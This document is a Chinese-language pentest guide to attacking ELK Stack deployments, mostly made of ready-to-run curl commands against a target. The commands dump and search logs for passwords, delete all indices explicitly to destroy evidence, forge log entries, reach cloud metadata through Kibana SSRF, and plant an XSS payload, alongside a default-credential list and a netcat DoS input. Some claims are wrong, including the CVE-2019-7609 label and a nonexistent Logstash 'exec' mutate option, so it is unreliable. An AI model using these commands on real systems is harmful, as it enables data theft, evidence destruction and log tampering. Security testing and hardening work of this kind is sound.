# ELK 安全测试 (ELK Security Testing)

---

## 第一部分：文档概述

### 1.1 编写目的
本文档旨在为渗透测试人员提供 ELK Stack（Elasticsearch、Logstash、Kibana）的安全测试方法论，帮助测试人员评估 ELK 基础设施的安全性。

### 1.2 适用范围
本文档适用于以下场景：
- Elasticsearch 集群安全测试
- Logstash 管道安全评估
- Kibana 界面安全测试
- 日志数据完整性验证

### 1.3 读者对象
- 渗透测试工程师
- 大数据安全分析师
- 系统管理员
- 安全架构师

---

## 第二部分：核心渗透技术专题

### 2.1 技术介绍

ELK Stack 是流行的日志管理和分析平台，由 Elasticsearch（搜索和分析引擎）、Logstash（数据处理管道）和 Kibana（可视化界面）组成。

**核心原理：**
- **Elasticsearch 未授权访问**：默认无认证，9200 端口暴露可导致数据泄露
- **Kibana 漏洞**：历史版本存在多个 RCE 和 SSRF 漏洞
- **Logstash 注入**：Groq 模式可被注入
- **索引数据篡改**：可直接修改日志索引

### 2.2 攻击常见于哪些业务场景

| **业务场景** | **功能示例** | **风险点描述** |
| :--- | :--- | :--- |
| **公开 Elasticsearch** | 9200 端口暴露 | 未授权访问所有日志数据 |
| **Kibana 仪表板** | 日志查询界面 | SSRF、XSS、RCE 漏洞 |
| **Logstash 处理** | 日志解析管道 | 配置注入、代码执行 |
| **索引生命周期** | ILM 策略 | 日志过早删除或篡改 |
| **跨集群复制** | CCR 功能 | 凭据泄露、数据篡改 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**Elasticsearch 探测：**
```bash
# 检测 Elasticsearch 服务
curl http://target:9200/
curl http://target:9200/_cluster/health
curl http://target:9200/_cat/indices

# 检查是否需要认证
# 无认证：直接返回信息
# 有认证：返回 401 或要求密码

# 枚举索引
curl http://target:9200/_cat/indices?v

# 搜索敏感数据
curl http://target:9200/logs-*/_search -d '
{
  "query": {
    "match": {"message": "password"}
  }
}'
```

**Kibana 探测：**
```bash
# 检测 Kibana 界面
curl http://target:5601/

# 检查版本信息
curl http://target:5601/api/status

# 枚举保存的对象
curl http://target:5601/api/saved_objects/_find?type=visualize

# 测试 SSRF
curl http://target:5601/api/console/proxy?path=http://internal:80/&method=GET
```

**Logstash 探测：**
```bash
# Logstash 通常不直接暴露 HTTP
# 检查管理 API（如果启用）
curl http://target:9600/_node/stats

# 检查配置文件
# 如果可访问配置文件，查找注入点
```

#### 2.3.2 白盒测试

**配置审计：**
```yaml
# elasticsearch.yml 危险配置
# 1. 无认证
xpack.security.enabled: false

# 2. 绑定所有接口
network.host: 0.0.0.0

# 3. 无 CORS 限制
http.cors.enabled: true
http.cors.allow-origin: "*"

# 4. 脚本引擎无限制
script.inline: true
script.indexed: true
```

```ruby
# Logstash 管道配置危险示例
# 1. 执行任意命令
filter {
  mutate {
    exec => "whoami"  # 危险
  }
}

# 2. 无过滤的用户输入
filter {
  grok {
    match => { "message" => "%{USER:username}" }
    # 如果用户输入可控，可能注入
  }
}
```

### 2.4 漏洞利用方法

#### 2.4.1 Elasticsearch 未授权访问

```bash
# 数据泄露
curl http://target:9200/logs-*/_search -d '
{
  "size": 10000,
  "_source": ["message", "@timestamp", "source.ip"]
}'

# 搜索敏感信息
curl http://target:9200/logs-*/_search -d '
{
  "query": {
    "regex": {
      "message": ".*password.*"
    }
  }
}'

# 删除所有索引（破坏证据）
curl -X DELETE http://target:9200/logs-*

# 插入虚假日志
curl -X POST http://target:9200/logs-fake/_doc -d '
{
  "@timestamp": "2024-01-01T00:00:00Z",
  "message": "Fake log entry",
  "source.ip": "127.0.0.1"
}'
```

#### 2.4.2 Kibana 漏洞利用

**SSRF 利用：**
```bash
# CVE-2019-7609 等 SSRF 漏洞
curl http://target:5601/api/console/proxy \
  -H "Content-Type: application/json" \
  -d '{"path":"http://169.254.169.254/latest/meta-data/","method":"GET"}'

# 访问内网服务
curl http://target:5601/api/console/proxy \
  -H "Content-Type: application/json" \
  -d '{"path":"http://internal-api:8080/admin","method":"GET"}'
```

**XSS 利用：**
```bash
# 在 Kibana 中存储恶意可视化
# 如果 Kibana 版本存在 XSS 漏洞
# 通过修改保存的对象注入 JavaScript

curl -X POST http://target:5601/api/saved_objects/visualization/test \
  -H "kbn-xsrf: true" \
  -d '{
    "attributes": {
      "visState": "{\"title\":\"XSS\",\"type\":\"histogram\",\"params\":{\"injectScript\":\"<script>alert(1)</script>\"}}"
    }
  }'
```

#### 2.4.3 Logstash 注入

```bash
# 如果 Logstash 使用 Grok 解析用户输入
# 构造恶意输入导致 DoS 或代码执行

# Grok DoS（正则回溯）
# 发送超长输入匹配复杂模式
python3 -c "print('A'*100000)" | nc logstash_input_port

# 如果配置了 exec 输出
# 可能触发命令执行
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过认证

```bash
# 如果启用了基本认证但配置弱
# 尝试默认凭证
curl -u elastic:changeme http://target:9200/
curl -u kibana:kibana http://target:5601/
curl -u logstash:logstash http://target:9600/

# 尝试空白密码
curl -u elastic: http://target:9200/
```

#### 2.5.2 绕过网络隔离

```bash
# 如果 Elasticsearch 在内网
# 通过 SSRF 访问
# 使用 Kibana 的 console proxy

# 或通过 compromised 应用
# 许多应用直接连接 Elasticsearch
# 攻陷应用后获取 ES 访问权限
```

---

## 第三部分：附录

### 3.1 ELK 安全配置检查清单

| **组件** | **配置项** | **安全设置** |
| :--- | :--- | :--- |
| Elasticsearch | xpack.security.enabled | true |
| Elasticsearch | network.host | 内网 IP |
| Elasticsearch | http.cors.allow-origin | 具体域名 |
| Kibana | xpack.security.enabled | true |
| Kibana | server.host | 内网 IP |
| Logstash | API 认证 | 启用 |

### 3.2 Elasticsearch 常用 API

| **API** | **用途** | **风险** |
| :--- | :--- | :--- |
| `GET /` | 获取集群信息 | 信息泄露 |
| `GET /_cat/indices` | 列出索引 | 信息泄露 |
| `GET /_search` | 搜索数据 | 数据泄露 |
| `DELETE /*` | 删除索引 | 数据丢失 |
| `PUT /*` | 创建索引 | 数据篡改 |

### 3.3 参考资源

- [Elastic Security Documentation](https://www.elastic.co/guide/en/security/current/index.html)
- [CIS Elasticsearch Benchmark](https://www.cisecurity.org/benchmark/elasticsearch)
- [OWASP ELK Security](https://owasp.org/www-project-web-security-testing-guide/)
